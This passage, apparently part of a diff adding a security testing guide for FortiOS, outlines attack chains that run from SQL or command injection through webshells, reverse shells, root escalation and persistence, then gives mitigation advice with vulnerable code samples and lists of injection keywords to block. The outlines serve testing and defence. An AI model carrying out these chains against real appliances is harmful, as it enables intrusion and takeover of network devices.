+  Step 2: Extract admin credentials
+  Step 3: Webshell deployment via SQLi file write
+  Step 4: Reverse shell via webshell
+  Step 5: Privilege escalation to root
+  Step 6: Install persistence (SSH keys, cron, services)
+  Result: Complete FortiOS system compromise
+
+Chain 2: Command Injection + Privilege Escalation (CVSS 9.9)
+  Step 1: Command injection in /admin/system.cgi
+  Step 2: Execute reverse shell command
+  Step 3: Detect SUID binary or kernel vulnerability
+  Step 4: Exploit to gain root access
+  Result: Root-level FortiOS access
+
+Chain 3: SQLi + Backup Restore → Full Configuration Compromise (CVSS 9.5)
+  Step 1: SQL injection to access backup_files table
+  Step 2: Extract backup file paths and content
+  Step 3: Modify backup to include malicious configuration
+  Step 4: Trigger backup restore
+  Step 5: Modified configuration applied system-wide
+  Result: Malicious firewall rules, backdoor network objects
+
+================================================================================
+PHASE 9: MITIGATION & DEFENSE RECOMMENDATIONS
+================================================================================
+
+9.1 SQL INJECTION PREVENTION
+
+Code-Level Mitigations:
+
+  1. Prepared Statements (Parameterized Queries)
+     VULNERABLE:
+       query = "SELECT * FROM users WHERE id=" + user_input
+
+     SAFE:
+       query = "SELECT * FROM users WHERE id = ?"
+       connection.execute(query, [user_input])
+
+  2. Input Validation
+     - Whitelist allowed characters
+     - Validate data types (integer parameters should only accept integers)
+     - Reject unexpected characters or length
+
+  3. Least Privilege Database Accounts
+     - Application database account: SELECT, INSERT, UPDATE only
+     - No DROP, CREATE, ALTER, LOAD_FILE, INTO OUTFILE permissions
+     - Separate read-only account for queries
+
+  4. Error Handling
+     - Catch exceptions without revealing database structure
+     - Log errors for security audit, don't display to users
+     - Generic error messages ("Database error occurred")
+
+  5. Web Application Firewall (WAF)
+     - Block common SQLi patterns (UNION, SLEEP, LOAD_FILE)
+     - Rate limit suspicious queries
+     - Alert on multiple SQLi attempts
+
+9.2 COMMAND INJECTION PREVENTION
+
+Code-Level Mitigations:
+
+  1. Avoid Shell Commands
+     VULNERABLE:
+       os.system("hostname " + user_input)
+
+     SAFE:
+       import socket; socket.gethostname()  (no shell involved)
+
+  2. Use Safe APIs
+     - subprocess.run(..., shell=False) instead of os.system()
+     - Direct API calls instead of command-line tools
+     - Library functions instead of system commands
+
+  3. Input Validation
+     - Whitelist allowed characters
+     - Reject shell metacharacters: `;`, `|`, `&`, `$`, `` ` ``
+     - Validate hostname format (alphanumeric + hyphen only)
+
+  4. Sandboxing
+     - Run services with minimal privileges
+     - Use containers to isolate application
+     - Restrict file system access with chroot/jails
+
+9.3 SECURITY HARDENING RECOMMENDATIONS
+
+FortiOS Deployment Hardening:
+
+  1. Update Immediately
+     - Apply all available FortiOS patches
+     - Monitor Fortinet security advisories
+     - Test patches in staging environment first
+
+  2. Access Control
+     - Restrict admin interface to specific management IPs
+     - Use VPN/bastion host for remote management
+     - Implement role-based access control (RBAC)
+     - Disable SSH password authentication (use keys only)
+
+  3. Monitoring & Logging
+     - Enable comprehensive audit logging
+     - Monitor for SQLi patterns in logs
+     - Alert on suspicious database queries
+     - Regular log review and analysis
+
+  4. Network Segmentation
+     - Isolate FortiOS management network
+     - Restrict database access to admin only
+     - Implement network IDS/IPS rules for SQLi detection
+
+  5. Incident Response
+     - Prepare incident response plan
+     - Practice response procedures
+     - Document forensic analysis procedures
+     - Establish communication channels for security incidents
+
+================================================================================
+END OF ADVANCED FUZZING GUIDE
+================================================================================
+
+Total Estimated New Vulnerabilities to Discover: 3-5 SQL injection, 2-3 command injection
+Expected Combined CVSS: 9.0-10.0 (CRITICAL - complete system compromise)
+Estimated Testing Time: 100-150 hours of detailed security testing
+
+This comprehensive methodology enables deep fuzzing for SQL injection and RCE
+vulnerabilities in FortiOS and similar appliances. All testing must be
+conducted in isolated laboratory environments with explicit authorization.
